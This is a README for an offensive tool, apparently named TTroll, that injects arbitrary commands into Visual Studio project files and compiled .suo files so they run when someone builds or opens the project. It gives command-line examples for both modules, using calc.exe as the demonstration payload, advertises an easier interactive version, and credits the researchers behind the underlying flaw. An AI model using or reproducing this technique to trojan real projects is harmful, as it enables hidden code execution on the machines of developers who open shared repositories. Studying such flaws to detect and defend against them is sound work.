# TTroll

**TTroll** exploits vulnerabilities in Visual Studio triggers, targeting project files like `.sln` and `.vcxproj`/`.csproj`.

## Features

### 1. **Using triggers**

Executes arbitrary commands when the specified input trigger is activated (ex: `GetFrameworkPaths`, `Compile`, `BeforeBuild`)

#### WARNING: Deleting the lines which contains the modified XML will break it.

(CLI) Example of **Module 1 (Project)** usage: 
```
projectroll --module=1 --path=C:\Anywhere\Project.csproj --trigger=Compile --command="start calc.exe" --ps=false
```
Opens calc.exe when the user compiles project.

### 2. **Using compiled .suo**
Executes arbitrary commands when user opens project.

#### WARNING: Deleting the .vs folder/.suo file will break it.

(CLI) Example of **Module 2 (Compiled Suo)** usage:
```
projectroll --module=2 --path=C:\Anywhere\.suo --command="cmd /c start calc.exe"
```
Opens calc.exe when the user opens project.

##### - Btw i added noob version that is easier to use, you can use it by just opening the .exe and it will ask you the parameters of the module you selected as well

## Credits
The vulnerability has been discovered by cjm00n (https://github.com/cjm00n) & edwardzpeng (https://x.com/edwardzpeng)

VS.DE Visual Studio .suo Deserialization Exploit - https://github.com/moom825/visualstudio-suo-exploit
